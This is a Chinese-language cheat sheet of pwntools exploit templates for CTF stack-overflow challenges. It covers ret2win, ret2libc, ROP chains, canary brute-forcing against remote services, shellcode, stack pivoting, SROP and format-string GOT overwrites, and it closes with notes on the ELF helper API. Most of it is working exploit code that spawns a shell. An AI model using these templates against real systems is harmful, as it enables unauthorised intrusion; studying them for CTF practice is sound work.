---
title: "Pwn 栈溢出常用 Python 代码总结"
lastmod: 2026-04-21T22:56:42+08:00
draft: false
---
这份文档按实战流程整理，默认使用 `pwntools`。

适用范围：

* 栈溢出
* ret2win
* ret2libc
* canary 爆破 / 绕过
* ROP
* shellcode
* 栈迁移
* 常见调试与收发模板

安装：

```bash
pip install pwntools
```

## 1. 最小模板

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

HOST = "127.0.0.1"
PORT = 9999

elf = ELF("./pwn")

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process("./pwn")

p = start()
p.interactive()
```

64 位：

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")
elf = ELF("./pwn")
p = process("./pwn")
```

## 2. 本地、远程、附加 gdb

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")

def start():
    if args.GDB:
        return gdb.debug("./pwn", gdbscript="""
            b *main
            c
        """)
    if args.REMOTE:
        return remote("example.com", 10000)
    return process("./pwn")

p = start()
```

对已经启动的进程附加：

```python
p = process("./pwn")
gdb.attach(p, gdbscript="""
    b *main
    c
""")
pause()
```

## 3. 常用收发代码
send和sendline的区别是sendline加了一个换行符\n

```python
p.send(b"AAAA")
p.sendline(b"AAAA")

p.sendafter(b"input:", b"AAAA")
p.sendlineafter(b"input:", b"AAAA")

data = p.recv()
data = p.recv(4)
data = p.recvuntil(b"\n")
data = p.recvline()

p.interactive()
```

建议统一用字节串：

```python
p.sendlineafter(b"> ", b"1")
```

## 4. 打包与解包

32 位：

```python
payload = p32(0x08048456)
addr = u32(b"\x78\x56\x34\x12")
```

64 位：

```python
payload = p64(0x40123A)
addr = u64(data.ljust(8, b"\x00"))
```

通用：

```python
payload = flat(
    b"A" * 40,
    0x40101a,
    0x401176,
)
```

## 5. 计算偏移

生成 pattern：

```python
payload = cyclic(200)
```

程序崩溃后，根据寄存器值找偏移：

32 位：

```python
offset = cyclic_find(0x6161616c)
print(offset)
```

64 位常见写法：

```python
offset = cyclic_find(0x6161616161616168)
print(offset)
```

也可以手工传字节：

```python
offset = cyclic_find(b"kaaa")
```

## 6. ret2win

题目有一个隐藏函数 `win()` / `flag()`：

```python
from pwn import *

context(os="linux", arch="i386")
elf = ELF("./pwn")
p = process("./pwn")

offset = 40
win = elf.sym["win"]

payload = b"A" * offset + p32(win)
p.sendline(payload)
p.interactive()
```

64 位如果栈对齐有问题，先补一个 `ret`：

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
p = process("./pwn")

offset = 40
ret = 0x40101a
win = elf.sym["win"]

payload = flat(
    b"A" * offset,
    ret,
    win,
)
p.sendline(payload)
p.interactive()
```

## 7. 传参调用函数

32 位参数走栈：

```python
from pwn import *

context(os="linux", arch="i386")
elf = ELF("./pwn")
p = process("./pwn")

offset = 44
system_plt = elf.plt["system"]
binsh = next(elf.search(b"/bin/sh"))

payload = flat(
    b"A" * offset,
    system_plt,
    0xdeadbeef,
    binsh,
)
p.sendline(payload)
p.interactive()
```

64 位参数一般要控寄存器：

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
p = process("./pwn")

offset = 40
pop_rdi = 0x4012c3
system_plt = elf.plt["system"]
binsh = next(elf.search(b"/bin/sh"))

payload = flat(
    b"A" * offset,
    pop_rdi,
    binsh,
    system_plt,
)
p.sendline(payload)
p.interactive()
```

## 8. 泄露地址

典型思路：先调用 `puts(puts@got)` 泄露真实地址，再回到 `main` 第二次打。

32 位：

```python
from pwn import *

context(os="linux", arch="i386")
elf = ELF("./pwn")
p = process("./pwn")

offset = 44
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.sym["main"]

payload = flat(
    b"A" * offset,
    puts_plt,
    main,
    puts_got,
)
p.sendline(payload)

leak = u32(p.recvuntil(b"\xf7")[-4:])
print(hex(leak))
```

64 位：

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
p = process("./pwn")

offset = 40
pop_rdi = 0x4012c3
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.sym["main"]

payload = flat(
    b"A" * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    main,
)
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
print(hex(leak))
```

更稳一点的泄露读取方式：

```python
p.recvuntil(b"something\n")
leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
```

## 9. ret2libc

拿到 `puts` 实际地址后，算 libc 基址，再算 `system` 和 `"/bin/sh"`。

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = remote("pwn.challenge.ctf.show", 28134)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

offset = 6

printf_got = elf.got["printf"]

# 1. 泄露 printf 真实地址
payload = p32(printf_got) + b"%6$s"
io.send(payload)

# 32 位 libc 地址一般是 0xf7xxxxxx
# 小端泄露出来一般是 xx xx xx f7
printf_addr = u32(io.recvuntil(b"\xf7")[-4:])
log.success(f"printf_addr = {hex(printf_addr)}")

# 2. 算 libc base 和 system
libc_base = printf_addr - libc.sym["printf"]
system = libc_base + libc.sym["system"]

log.success(f"libc_base = {hex(libc_base)}")
log.success(f"system = {hex(system)}")

# 3. 把 printf@got 改成 system
payload = fmtstr_payload(offset, {printf_got: system}, write_size="short")
io.send(payload)

# 4. 触发 system("/bin/sh")
io.sendline(b"/bin/sh")
io.interactive()

```

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
p = process("./pwn")

offset = 40
pop_rdi = 0x4012c3
ret = 0x40101a

puts_leak = 0x7ffff7a5f420
libc.address = puts_leak - libc.sym["puts"]
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    binsh,
    system,
)
p.sendline(payload)
p.interactive()
```

典型双阶段模板：

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("example.com", 10000)
    return process("./pwn")

p = start()

offset = 40
pop_rdi = 0x4012c3
ret = 0x40101a

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
p.sendline(payload)

p.recvuntil(b"\n")
puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.success(f"puts leak: {hex(puts_leak)}")

libc.address = puts_leak - libc.sym["puts"]
log.success(f"libc base: {hex(libc.address)}")

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.sym["system"],
)
p.sendline(payload)
p.interactive()
```

## 10. 直接使用 ROP

让 pwntools 帮你找 gadget：

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
print(hex(pop_rdi))
```

直接构造链：

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")
rop = ROP(elf)

rop.call("puts", [elf.got["puts"]])
rop.call("main")

payload = flat(
    b"A" * 40,
    rop.chain(),
)
print(rop.dump())
```

配合 libc：

```python
libc = ELF("./libc.so.6")
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
rop.system(binsh)
```

## 11. canary 泄露或爆破

### 11.1 已知输出中能泄露 canary

如果程序有格式化字符串、越界读、回显栈数据，常见写法：

```python
canary = u64(leak_data[0:8]) & 0xffffffffffffff00
print(hex(canary))
```

注意 64 位 canary 最低字节通常是 `\x00`。

### 11.2 逐字节爆破 canary

适合：

* 服务每次连接都会重新 fork
* canary 固定
* 错误时会直接退出

32 位示例：

```python
from pwn import *

context(os="linux", arch="i386")

HOST = "example.com"
PORT = 10000

canary = b""
offset = 32

for _ in range(4):
    for guess in range(256):
        p = remote(HOST, PORT)
        p.sendlineafter(b">", b"200")

        payload = b"A" * offset + canary + p8(guess)
        p.sendafter(b"$ ", payload)

        data = p.recv(timeout=0.5)
        if b"stack smashing detected" not in data and b"Canary Value Incorrect!" not in data:
            canary += p8(guess)
            log.success(f"canary = {canary.hex()}")
            p.close()
            break
        p.close()
```

64 位示例：

```python
from pwn import *

context(os="linux", arch="amd64")

canary = b"\x00"
offset = 0x28

for _ in range(7):
    for guess in range(256):
        p = remote("example.com", 10000)
        payload = b"A" * offset + canary + p8(guess)
        p.send(payload)
        data = p.recv(timeout=0.3)
        if b"*** stack smashing detected ***" not in data:
            canary += p8(guess)
            log.success(hex(u64(canary.ljust(8, b"\x00"))))
            p.close()
            break
        p.close()
```

### 11.3 带 canary 的最终 payload

32 位：

```python
payload = flat(
    b"A" * offset,
    canary,
    b"B" * 12,
    ret_addr,
)
```

64 位：

```python
payload = flat(
    b"A" * offset,
    canary,
    b"B" * 8,
    pop_rdi,
    binsh,
    system,
)
```

## 12. shellcode

适用于：

* 栈可执行
* 或者你能把 shellcode 写到可执行段

生成 shellcode：

```python
from pwn import *

context(os="linux", arch="i386")
sc = asm(shellcraft.sh())
print(sc)
```

64 位：

```python
from pwn import *

context(os="linux", arch="amd64")
sc = asm(shellcraft.sh())
```

拼接 payload：

```python
buf_addr = 0xffffd530
payload = asm(shellcraft.sh()).ljust(112, b"\x90") + p32(buf_addr)
```

NOP sled：

```python
payload = b"\x90" * 100 + asm(shellcraft.sh())
```

## 13. jmp esp / jmp rsp

32 位常见：

```python
jmp_esp = 0x08048504
payload = flat(
    b"A" * offset,
    jmp_esp,
    asm(shellcraft.sh()),
)
```

64 位常见思路是跳到 `rsp` 附近，或者直接 ROP 调 `mprotect` / `read`。

## 14. 栈迁移

如果可控空间不够，先迁移到 `.bss` 或堆上。

### 14.1 leave; ret

```python
from pwn import *

context(os="linux", arch="amd64")
elf = ELF("./pwn")

leave_ret = 0x4011fd
fake_rbp = elf.bss() + 0x500

payload = flat(
    b"A" * 40,
    fake_rbp,
    leave_ret,
)
```

第二段 ROP 放到 `fake_rbp` 指向的位置。

### 14.2 先 read 到 .bss，再迁移

```python
bss = elf.bss() + 0x800
read_plt = elf.plt["read"]
leave_ret = 0x4011fd
pop_rdi = 0x4012c3
pop_rsi_r15 = 0x4012c1
pop_rdx = 0x40117e

payload = flat(
    b"A" * 40,
    pop_rdi, 0,
    pop_rsi_r15, bss, 0,
    pop_rdx, 0x200,
    read_plt,
    bss,
    leave_ret,
)
```

## 15. SROP 简单模板

只在支持 `sigreturn` 的题里用。

```python
from pwn import *

context(os="linux", arch="amd64")

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x404500
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x404600
frame.rip = 0x40100f

payload = b"A" * 40 + p64(0x40102d) + bytes(frame)
```

## 16. one\_gadget 常见配合代码

如果你已经知道 one\_gadget 偏移：

```python
one = libc.address + 0xe3afe
payload = b"A" * 40 + p64(one)
```

但很多题约束不满足，所以通常还是优先 `system("/bin/sh")`。

## 17. 泄露栈地址 / PIE 基址

### 17.1 泄露返回地址推 PIE

```python
leak = 0x5555555548a3
pie_base = leak - 0x8a3
elf.address = pie_base
print(hex(elf.sym["main"]))
```

### 17.2 泄露栈地址后跳栈

```python
stack_addr = 0xffffd530
payload = asm(shellcraft.sh()).ljust(112, b"\x90") + p32(stack_addr)
```

## 18. 格式化输出里配合解析地址

有时虽然主漏洞是栈溢出，但 canary、libc、栈地址靠格式化字符串拿：

```python
p.sendlineafter(b">", b"%15$p")
leak = int(p.recvline().strip(), 16)
print(hex(leak))
```

批量解析：

```python
for i in range(1, 20):
    p = process("./pwn")
    p.sendlineafter(b">", f"%{i}$p".encode())
    print(i, p.recvline())
    p.close()
```

## 19. 常见辅助函数

```python
def sla(delim, data):
    p.sendlineafter(delim, data)

def sa(delim, data):
    p.sendafter(delim, data)

def sl(data):
    p.sendline(data)

def s(data):
    p.send(data)

def ru(delim):
    return p.recvuntil(delim)

def rl():
    return p.recvline()

def uu32(data):
    return u32(data.ljust(4, b"\x00"))

def uu64(data):
    return u64(data.ljust(8, b"\x00"))
```

使用：

```python
sla(b"> ", b"1")
sa(b"data: ", payload)
```

## 20. 日志输出

```python
log.info("start")
log.success(f"libc base = {hex(libc.address)}")
log.warning("maybe failed")
```

## 21. 常见完整模板

### 21.1 ret2win 模板

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")
elf = ELF("./pwn")

def start():
    if args.REMOTE:
        return remote("example.com", 10000)
    return process("./pwn")

p = start()
offset = 40
payload = b"A" * offset + p32(elf.sym["win"])
p.sendline(payload)
p.interactive()
```

### 21.2 ret2libc 模板

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("example.com", 10000)
    return process("./pwn")

p = start()

offset = 40
pop_rdi = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
p.sendline(payload)

p.recvuntil(b"\n")
puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = puts_leak - libc.sym["puts"]

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.sym["system"],
)
p.sendline(payload)
p.interactive()
```

### 21.3 canary 爆破 + ret2win 模板

```python
from pwn import *

context(os="linux", arch="i386", log_level="info")
elf = ELF("./pwn")

HOST = "example.com"
PORT = 10000
offset = 32

canary = b""
for _ in range(4):
    for guess in range(256):
        p = remote(HOST, PORT)
        p.sendlineafter(b">", b"200")
        payload = b"A" * offset + canary + p8(guess)
        p.sendafter(b"$ ", payload)
        data = p.recv(timeout=0.5)
        if b"Canary Value Incorrect!" not in data:
            canary += p8(guess)
            log.success(f"canary: {canary.hex()}")
            p.close()
            break
        p.close()

p = remote(HOST, PORT)
payload = flat(
    b"A" * offset,
    canary,
    p32(0) * 4,
    p32(elf.sym["flag"]),
)
p.sendlineafter(b">", b"-1")
p.sendafter(b"$ ", payload)
p.interactive()
```

## 22. 常见坑

### 22.1 `str` 和 `bytes` 混用

错：

```python
p.sendlineafter(">", "1")
```

对：

```python
p.sendlineafter(b">", b"1")
```

### 22.2 64 位栈对齐

如果调用 `system` 崩溃，先补一个 `ret`：

```python
payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    binsh,
    system,
)
```

### 22.3 泄露地址位数不够

```python
leak = u64(data.ljust(8, b"\x00"))
```

### 22.4 `recv()` 阻塞

```python
data = p.recv(timeout=0.5)
```

### 22.5 远程和本地 libc 不一致

常用方式：

* 本地加载题目给的 `libc.so.6`
* 先泄露地址再匹配 libc
* 不确定时不要直接套本地偏移

## 23. 建议的实战顺序

1. 先用 `checksec` 看保护。
2. 用 `cyclic` 找偏移。
3. 判断是 ret2win、ret2libc、shellcode 还是 canary 爆破。
4. 如果有 canary，优先找泄露；没有泄露再考虑爆破。
5. 如果有 PIE，先想办法泄露代码段地址。
6. 如果有 NX，优先 ROP / ret2libc。
7. 如果是 64 位，注意寄存器传参与栈对齐。

## 24. 一个通用起手脚本

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./pwn")
libc = ELF("./libc.so.6", checksec=False)

HOST = "example.com"
PORT = 10000

def start():
    if args.GDB:
        return gdb.debug("./pwn", gdbscript="""
            b *main
            c
        """)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process("./pwn")

def sla(delim, data):
    p.sendlineafter(delim, data)

def sa(delim, data):
    p.sendafter(delim, data)

def sl(data):
    p.sendline(data)

def s(data):
    p.send(data)

def ru(delim):
    return p.recvuntil(delim)

def rl():
    return p.recvline()

def uu64(data):
    return u64(data.ljust(8, b"\x00"))

p = start()

# 在这里写你的 exp

p.interactive()
```

## 25. 结论

栈溢出题的 Python 代码，本质上就是几类积木反复组合：

* 建立连接
* 控制收发
* 构造 payload
* 泄露地址
* 计算基址
* 拼 ROP
* 最后拿 shell / flag

所以真正要熟的是下面这些核心接口：

* `process`
* `remote`
* `sendlineafter`
* `recvuntil`
* `p32` / `p64`
* `u32` / `u64`
* `flat`
* `cyclic`
* `ELF`
* `ROP`
* `asm`
* `shellcraft`

这份文档可以直接当栈溢出题的速查表用。

## 26. 格式化字符串

```
fmtstr_payload(6, {printf_got: system_plt}, write_size="short")
```
### 1. 第一个参数 6

`6`

是格式化字符串偏移。

比如你的 payload 里放了地址：

`p32(printf_got)`

当程序执行：

`printf(buf);`

这个地址会被 printf 当成第几个参数读取。

如果它是第 6 个参数，就写：

`fmtstr_payload(6, ...)`

偏移一般这样扫：

`io.send(b"AAAA.%p.%p.%p.%p.%p.%p.%p.%p")`

如果输出里第 6 个位置出现：

`0x41414141`

说明偏移是 6。

### 2. 第二个参数 {printf_got: system_plt}

这是一个字典：

`{ 要写的地址: 要写进去的值 }`

在 94 题里：

`printf_got = 0x0804a010 system_plt = 0x08048400`

所以：

`{printf_got: system_plt}`

意思是：

`把 0x0804a010 这个地址里的值改成 0x08048400`

也就是：

`printf@got -> system@plt`

### 3. write_size="short"

控制每次写几个字节。

常见选项：

`write_size="byte" # 用 %hhn，一次写 1 字节 write_size="short" # 用 %hn，一次写 2 字节 write_size="int" # 用 %n，一次写 4 字节`

short 对应：

`%hn`

也就是每次写 2 字节。

32 位地址是 4 字节，所以通常会拆成两次写：

`低 2 字节 高 2 字节`

# pwntools ELF 用法笔记

## ELF 是什么

pwntools 里的 `ELF()` 用来解析本地二进制文件。

在 pwn 里，它常用来自动获取：

```text
PLT 地址
GOT 地址
函数符号地址
字符串地址
程序保护信息
```

比如本题：

```python
from pwn import *

elf = ELF("./pwn")
```

这样 `elf` 就代表当前目录下的 `pwn` 程序。

## 为什么要用 ELF

不用 `ELF()` 时，你要手动写地址：

```python
read_got = 0x0804a00c
printf_got = 0x0804a010
```

用了 `ELF()` 后，可以直接让 pwntools 从程序里解析：

```python
read_got = elf.got["read"]
printf_got = elf.got["printf"]
```

好处是：

```text
1. 不容易手抄错地址
2. 换附件后不用重新改一堆硬编码
3. 题解更清楚，别人一看就知道你在用哪个符号
```

## 常用属性

### 1. `elf.got`

`elf.got` 用来取 GOT 表地址。

GOT 里保存的是动态链接函数的真实地址。

本题里：

```python
read_got = elf.got["read"]
printf_got = elf.got["printf"]
```

等价于：

```python
read_got = 0x0804a00c
printf_got = 0x0804a010
```

在 pwn95 里，我们可以泄露：

```python
payload = p32(read_got) + b"%6$s"
```

意思是：

```text
把 read@got 当作地址，用 %s 读出里面保存的 read 真实 libc 地址
```

也可以最后覆写：

```python
fmtstr_payload(6, {printf_got: system}, write_size="short")
```

意思是：

```text
把 printf@got 改成 system
```

### 2. `elf.plt`

`elf.plt` 用来取 PLT 跳板地址。

例如：

```python
read_plt = elf.plt["read"]
printf_plt = elf.plt["printf"]
```

PLT 是程序里的调用跳板，比如：

```text
call read@plt
call printf@plt
```

注意区别：

```text
read@plt 是代码地址，拿来调用 read
read@got 是数据地址，里面存 read 的真实 libc 地址
```

泄露 libc 时要泄露 GOT，不是 PLT。

所以本题应该泄露：

```python
elf.got["read"]
```

而不是：

```python
elf.plt["read"]
```

### 3. `elf.sym` / `elf.symbols`

`elf.sym` 和 `elf.symbols` 基本一样，用来取程序里的符号地址。

例如：

```python
main = elf.sym["main"]
```

如果程序里有后门函数：

```python
backdoor = elf.sym["backdoor"]
```

就不用手动写：

```python
backdoor = 0x080485a6
```

### 4. `elf.search`

`elf.search()` 用来在程序里搜索字符串。

比如搜索 `/bin/sh`：

```python
binsh = next(elf.search(b"/bin/sh"))
```

如果字符串在程序本体里，这样就能直接找到。

如果字符串在 libc 里，就要对 libc 用：

```python
libc = ELF("./libc.so.6")
binsh = next(libc.search(b"/bin/sh"))
```

## pwn95 里的正确用法

本题没有 `system@plt`，所以不能直接写：

```python
system = elf.plt["system"]
```

因为程序没有导入 `system`，这句会报错。

正确路线是：

```python
elf = ELF("./pwn")

read_got = elf.got["read"]
printf_got = elf.got["printf"]
```

先泄露：

```python
payload = p32(read_got) + b"%6$s"
io.send(payload)
```

得到：

```text
read_addr = read 的真实 libc 地址
```

如果有 libc 文件：

```python
libc = ELF("./libc.so.6")
libc_base = read_addr - libc.sym["read"]
system = libc_base + libc.sym["system"]
```

如果没有 libc 文件，可以用 `DynELF` 或 libc database 去找。

最后改：

```python
payload = fmtstr_payload(6, {printf_got: system}, write_size="short")
io.send(payload)
```

然后：

```python
io.sendline(b"/bin/sh")
```

## 一句话记忆

```text
想调用函数：用 plt
想泄露 libc：读 got
想改函数跳转：写 got
想找程序内函数：用 sym
想找字符串：用 search
```

本题最重要的是：

```python
elf.got["read"]     # 用来泄露 read 的真实 libc 地址
elf.got["printf"]   # 用来覆写成 system
```
